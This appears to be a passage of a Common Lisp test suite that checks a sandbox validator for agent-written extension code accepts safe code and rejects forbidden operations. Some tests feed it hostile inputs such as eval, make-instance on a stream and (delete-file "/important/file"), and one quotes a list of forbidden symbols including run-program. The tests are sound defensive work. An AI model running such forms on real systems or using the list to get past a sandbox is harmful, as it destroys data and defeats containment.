;;; ─────────────────────────────────────────────────────────────────
;;; Make-Instance Escape Attempts
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-escape-make-instance
  "Test that make-instance is blocked (could create dangerous objects)"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(make-instance 'stream :direction :output))
    (is-false valid)
    (is (some (lambda (e) (search "make-instance" e :test #'char-equal)) errors))))

;;; ─────────────────────────────────────────────────────────────────
;;; Verify Safe Code Still Works
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-allows-safe-arithmetic
  "Test that safe arithmetic operations are allowed"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(let ((x 10) (y 20))
          (+ (* x y) (- x y) (/ x y))))
    (declare (ignore errors))
    (is-true valid)))

(test sandbox-allows-safe-list-operations
  "Test that safe list operations are allowed"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(let ((lst '(1 2 3 4 5)))
          (mapcar (lambda (x) (* x 2))
                  (remove-if #'oddp lst))))
    (declare (ignore errors))
    (is-true valid)))

(test sandbox-allows-safe-string-operations
  "Test that safe string operations are allowed"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(let ((s "hello world"))
          (concatenate 'string
                       (string-upcase s)
                       " - "
                       (string-downcase s))))
    (declare (ignore errors))
    (is-true valid)))

(test sandbox-allows-safe-control-flow
  "Test that safe control flow is allowed"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(let ((n 10))
          (cond
            ((< n 0) :negative)
            ((= n 0) :zero)
            ((< n 10) :small)
            (t :large))))
    (declare (ignore errors))
    (is-true valid)))

(test sandbox-allows-safe-higher-order
  "Test that safe higher-order functions are allowed"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(reduce #'+
                (mapcar (lambda (x) (* x x))
                        (remove-if-not #'evenp '(1 2 3 4 5 6 7 8 9 10)))))
    (declare (ignore errors))
    (is-true valid)))

(test sandbox-allows-local-functions
  "Test that local function definitions (flet/labels) are allowed"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(labels ((factorial (n)
                   (if (<= n 1)
                       1
                       (* n (factorial (1- n)))))
                 (fibonacci (n)
                   (if (<= n 1)
                       n
                       (+ (fibonacci (- n 1))
                          (fibonacci (- n 2))))))
          (list (factorial 5) (fibonacci 10))))
    (declare (ignore errors))
    (is-true valid)))

(test sandbox-allows-quoted-forbidden-symbols
  "Test that quoted forbidden symbols are allowed (they're data, not code)"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(list 'eval 'compile 'load 'delete-file 'run-program))
    (declare (ignore errors))
    (is-true valid)))

(test sandbox-allows-forbidden-as-variable-names
  "Test that forbidden symbol names as variables are allowed"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(let ((eval 1)
              (compile 2)
              (load 3))
          (+ eval compile load)))
    (declare (ignore errors))
    (is-true valid)))

(test sandbox-allows-forbidden-as-lambda-params
  "Test that forbidden symbol names as lambda parameters are allowed"
  (multiple-value-bind (valid errors)
      (autopoiesis.core:validate-extension-code
       '(lambda (eval compile load)
          (list eval compile load)))
    (declare (ignore errors))
    (is-true valid)))

;;; ─────────────────────────────────────────────────────────────────
;;; Compilation and Execution Tests
;;; ─────────────────────────────────────────────────────────────────

(test sandbox-compile-and-execute-safe
  "Test that safe code can be compiled and executed"
  (multiple-value-bind (ext errors)
      (autopoiesis.core:compile-extension
       "safe-factorial"
       '(labels ((fact (n)
                   (if (<= n 1) 1 (* n (fact (1- n))))))
          (fact 5)))
    (declare (ignore errors))
    (is-true ext)
    (is (= 120 (funcall (autopoiesis.core::extension-compiled ext))))))

(test sandbox-compile-rejects-dangerous
  "Test that dangerous code is rejected at compile time"
  (multiple-value-bind (ext errors)
      (autopoiesis.core:compile-extension
       "dangerous-eval"
       '(eval '(+ 1 2)))
    (is (null ext))
    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))

(test sandbox-register-and-invoke-safe
  "Test that safe extensions can be registered and invoked"
  (let ((test-registry (make-hash-table :test 'equal)))
    (multiple-value-bind (ext errors)
        (autopoiesis.core:register-extension
         "test-agent"
         '(+ 100 200)
         :registry test-registry)
      (declare (ignore errors))
      (is-true ext)
      (let ((result (autopoiesis.core:invoke-extension
                     (autopoiesis.core:extension-id ext)
                     :registry test-registry)))
        (is (= 300 result))))))

(test sandbox-register-rejects-dangerous
  "Test that dangerous extensions cannot be registered"
  (let ((test-registry (make-hash-table :test 'equal)))
    (multiple-value-bind (ext errors)
        (autopoiesis.core:register-extension
         "test-agent"
         '(delete-file "/important/file")
         :registry test-registry)
      (is (null ext))
      (is (some (lambda (e) (search "delete" e :test #'char-equal)) errors))
      ;; Verify nothing was registered
      (is (zerop (hash-table-count test-registry))))))
